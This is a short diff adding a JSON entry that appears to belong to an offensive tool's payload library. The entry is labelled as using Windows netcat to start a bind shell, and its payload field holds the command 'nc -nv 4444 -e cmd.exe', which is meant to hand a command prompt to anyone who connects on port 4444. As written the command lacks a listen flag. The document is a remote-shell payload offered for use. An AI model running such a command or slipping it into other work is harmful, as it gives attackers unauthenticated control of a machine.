@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "uses Windows netcat to start a bindshell",
+      "type": "bind",
+      "exec": "batch"
+    },
+    "payload": "nc -nv 4444 -e cmd.exe"
+  }
+}
